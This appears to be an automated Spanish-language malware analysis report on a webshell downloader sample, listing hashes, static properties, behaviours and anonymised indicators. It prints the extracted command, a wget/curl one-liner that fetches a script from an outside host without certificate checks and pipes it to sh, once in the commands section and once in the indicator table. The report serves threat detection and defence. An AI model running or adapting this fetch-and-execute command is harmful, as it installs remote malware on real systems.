# 🧬 Payload Analysis

`57058ec406251d88ebbe90c042c1df943866c15814071fcb8b3c8b3e0232794d`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `High`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:53.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `57058ec406251d88ebbe90c042c1df943866c15814071fcb8b3c8b3e0232794d`
- **SHA1:** `c60775fd6cc8ca35ef4754e9f25bd77bdc723386`
- **MD5:** `08805ea07497dbf10cdaa607a42bd8f4`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (320), with CRLF line terminators |
| Tamaño | 1.8 KiB |
| Entropía | 5.8 |
| Strings | 33 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (320), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 190.179.177.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrepPOS | strings |
| hash | 57058ec406251d88ebbe90c042c1df943866c15814071fcb8b3c8b3e0232794d | static_analysis |
| ip | 185.113.10.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
